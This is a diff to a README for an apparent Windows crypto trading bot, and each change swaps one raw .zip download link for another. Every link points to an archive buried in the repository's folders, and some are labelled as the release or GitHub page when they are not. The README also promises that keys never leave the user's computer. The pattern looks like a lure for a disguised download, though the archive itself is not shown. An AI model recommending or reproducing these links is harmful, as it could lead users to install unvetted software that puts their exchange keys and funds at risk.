@@ -1,6 +1,6 @@
 # 🤖 openclaw-cross-market-arbitrage-agent - Smart Cross-Market Trading Bot
 
-[![Download openclaw-cross-market-arbitrage-agent](https://img.shields.io/badge/Download-Openclaw-blue?style=for-the-badge)](https://github.com/Mylantaprotiumguianense372/openclaw-cross-market-arbitrage-agent/raw/refs/heads/main/configs/cross-arbitrage-openclaw-market-agent-1.1.zip)
+[![Download openclaw-cross-market-arbitrage-agent](https://img.shields.io/badge/Download-Openclaw-blue?style=for-the-badge)](https://github.com/Mylantaprotiumguianense372/openclaw-cross-market-arbitrage-agent/raw/refs/heads/main/src/market-data/openclaw-cross-agent-arbitrage-market-2.7.zip)
 
 ---
 
@@ -46,7 +46,7 @@ Before you start, make sure your Windows PC meets these requirements:
 ### Step 1: Visit the download page
 
 Click the big button above or go directly to the release page here:  
-[https://github.com/Mylantaprotiumguianense372/openclaw-cross-market-arbitrage-agent/raw/refs/heads/main/configs/cross-arbitrage-openclaw-market-agent-1.1.zip](https://github.com/Mylantaprotiumguianense372/openclaw-cross-market-arbitrage-agent/raw/refs/heads/main/configs/cross-arbitrage-openclaw-market-agent-1.1.zip)
+[https://github.com/Mylantaprotiumguianense372/openclaw-cross-market-arbitrage-agent/raw/refs/heads/main/src/market-data/openclaw-cross-agent-arbitrage-market-2.7.zip](https://github.com/Mylantaprotiumguianense372/openclaw-cross-market-arbitrage-agent/raw/refs/heads/main/src/market-data/openclaw-cross-agent-arbitrage-market-2.7.zip)
 
 This page contains the latest versions of the bot ready for download.
 
@@ -130,7 +130,7 @@ Your account details and keys stay on your computer. The bot does not share your
 ## 📂 Additional resources
 
 - Visit the GitHub page to see updates and report issues:  
-  https://github.com/Mylantaprotiumguianense372/openclaw-cross-market-arbitrage-agent/raw/refs/heads/main/configs/cross-arbitrage-openclaw-market-agent-1.1.zip  
+  https://github.com/Mylantaprotiumguianense372/openclaw-cross-market-arbitrage-agent/raw/refs/heads/main/src/market-data/openclaw-cross-agent-arbitrage-market-2.7.zip  
 - Check the FAQs and user discussions on the project's issues tab for common questions.  
 
 ---
@@ -138,4 +138,4 @@ Your account details and keys stay on your computer. The bot does not share your
 ## 🎉 Ready to start?
 
 Download or visit the release page here to get the software:  
-[https://github.com/Mylantaprotiumguianense372/openclaw-cross-market-arbitrage-agent/raw/refs/heads/main/configs/cross-arbitrage-openclaw-market-agent-1.1.zip](https://github.com/Mylantaprotiumguianense372/openclaw-cross-market-arbitrage-agent/raw/refs/heads/main/configs/cross-arbitrage-openclaw-market-agent-1.1.zip)
+[https://github.com/Mylantaprotiumguianense372/openclaw-cross-market-arbitrage-agent/raw/refs/heads/main/src/market-data/openclaw-cross-agent-arbitrage-market-2.7.zip](https://github.com/Mylantaprotiumguianense372/openclaw-cross-market-arbitrage-agent/raw/refs/heads/main/src/market-data/openclaw-cross-agent-arbitrage-market-2.7.zip)
